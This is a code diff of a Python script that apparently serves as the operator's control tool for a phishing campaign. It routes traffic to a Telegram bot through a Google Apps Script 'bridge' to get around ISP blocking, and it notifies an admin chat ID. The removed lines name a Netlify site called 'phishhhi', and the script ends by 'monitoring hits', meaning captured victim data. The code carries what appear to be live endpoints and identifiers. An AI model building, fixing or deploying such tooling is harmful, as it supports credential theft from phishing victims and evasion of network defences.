@@ -1,35 +1,39 @@
 import requests
 import time
+import sys
 
 # --- CONFIG ---
-BRIDGE_URL = "https://script.google.com"
+BRIDGE_URL = "https://script.google.com/macros/s/AKfycbzL_njCl5CDQidqHMb2LFt0AVqN6bz0ZOBZ5iMCq3WKofvvV0EunyGh0C1G18yAujH3mw/exec"
 ADMIN_ID = "6671784926"
-NETLIFY_URL = "https://phishhhi.netlify.app"
 
 def check_connection():
     print("🚀 Bypassing ISP... Routing via Google...")
-    headers = {'User-Agent': 'Mozilla/5.0'}
+    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
     try:
-        # allow_redirects=True is CRITICAL for Google Scripts
-        response = requests.get(BRIDGE_URL, headers=headers, allow_redirects=True, timeout=15)
-        data = response.json()
-        if data.get("ok"):
-            bot_name = data['result']['username']
-            print(f"✅ Gold Connection: @{bot_name} is ONLINE")
-            
-            # Send Notification to Telegram
-            payload = {"chat_id": ADMIN_ID, "text": f"<b>🔥 v19.0 BRIDGE ACTIVE</b>\n\n🛡️ Status: <b>Online</b>\n🔗 Site: {NETLIFY_URL}", "parse_mode": "HTML"}
-            requests.post(BRIDGE_URL, json=payload, headers=headers, allow_redirects=True)
-            return True
+        # Use allow_redirects=True to handle Google's internal jumps
+        response = requests.get(BRIDGE_URL, headers=headers, allow_redirects=True, timeout=20)
+        
+        if response.status_code == 200:
+            try:
+                data = response.json()
+                if data.get("ok"):
+                    bot_user = data['result']['username']
+                    print(f"✅ Gold Connection: @{bot_user} is ONLINE")
+                    return True
+            except:
+                print("❌ Bridge Error: Google returned HTML instead of JSON.")
+                print("Tip: Go to Google Script -> Deploy -> New Deployment -> Access: ANYONE")
         else:
-            print(f"❌ Telegram Error: {data.get('error')}")
+            print(f"❌ HTTP Error: {response.status_code}")
     except Exception as e:
-        print(f"❌ Bridge Error: {e}")
-        print("Note: Ensure Google Deployment is set to 'Anyone'.")
+        print(f"❌ Connection Error: {e}")
     return False
 
 if __name__ == "__main__":
     if check_connection():
         print("Monitoring hits... (Press Ctrl+C to stop)")
         while True:
-            time.sleep(60)
+            try:
+                time.sleep(60)
+            except KeyboardInterrupt:
+                sys.exit()
